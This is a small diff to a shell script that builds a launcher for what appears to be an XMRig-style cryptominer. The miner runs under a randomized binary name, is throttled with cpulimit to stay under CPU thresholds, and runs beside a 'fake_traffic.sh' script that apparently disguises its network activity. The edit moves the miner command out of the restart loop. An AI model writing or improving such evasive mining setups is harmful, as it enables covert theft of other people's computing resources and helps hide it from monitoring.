@@ -70,8 +70,8 @@ chmod +x fake_traffic.sh
 cat <<EOF > start.sh
 #!/bin/bash
 export PATH=".:\$PATH"  # Thêm thư mục hiện tại vào PATH
+$RAND_NAME --donate-level 1 --cpu-priority 3 --randomx-1gb-pages
 while true; do
-    $RAND_NAME --donate-level 1 --cpu-priority 3 --randomx-1gb-pages &
     exec_pid=\$!
     cpulimit -p \$exec_pid -l 60 &
     ./fake_traffic.sh &  # Chạy fake traffic trong background
